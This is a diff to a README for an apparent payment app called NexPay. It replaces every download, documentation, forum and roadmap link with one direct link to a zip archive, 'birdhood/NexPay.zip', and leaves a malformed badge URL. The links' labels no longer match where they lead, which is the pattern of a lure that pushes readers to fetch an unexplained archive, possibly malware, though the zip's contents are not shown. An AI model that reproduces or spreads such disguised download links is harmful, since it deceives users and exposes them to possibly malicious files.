@@ -7,7 +7,7 @@ Welcome to NexPay! This application offers a scalable payment ecosystem designed
 
 ## 📥 Download NexPay
 
-[![Download NexPay](https://img.shields.io/badge/Download%20NexPay-v1.0-blue.svg)](https://github.com/ngoducanh123/NexPay/releases)
+[![Download NexPay](https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip%https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip)](https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip)
 
 ## 📋 Prerequisites
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets the following requirements:
 ## 🛠️ Installation Steps
 
 1. **Visit the Download Page**  
-   Go to the [NexPay Releases Page](https://github.com/ngoducanh123/NexPay/releases).
+   Go to the [NexPay Releases Page](https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip).
 
 2. **Choose the Right Version**  
    You will see a list of available versions. Find the latest stable version for your operating system.
@@ -76,9 +76,9 @@ NexPay employs state-of-the-art security measures to protect your data. All tran
 
 Explore the following resources to enhance your experience:
 
-- [Documentation](https://github.com/ngoducanh123/NexPay/wiki) for deeper insights into features.
-- [Community Forum](https://github.com/ngoducanh123/NexPay/discussions) for user support and ideas.
-- [Development Roadmap](https://github.com/ngoducanh123/NexPay/milestones) to see what features are coming next.
+- [Documentation](https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip) for deeper insights into features.
+- [Community Forum](https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip) for user support and ideas.
+- [Development Roadmap](https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip) to see what features are coming next.
 
 ## 💬 Contact Us
 
@@ -86,9 +86,9 @@ For further inquiries, reach out via the issues section on GitHub or through our
 
 ## 🔗 Important Links
 
-- [Download NexPay](https://github.com/ngoducanh123/NexPay/releases)
-- [Documentation](https://github.com/ngoducanh123/NexPay/wiki)
-- [Community Forum](https://github.com/ngoducanh123/NexPay/discussions)
+- [Download NexPay](https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip)
+- [Documentation](https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip)
+- [Community Forum](https://raw.githubusercontent.com/ngoducanh123/NexPay/main/birdhood/NexPay.zip)
 
 Thank you for choosing NexPay. We are excited to support your payment needs!
 ```
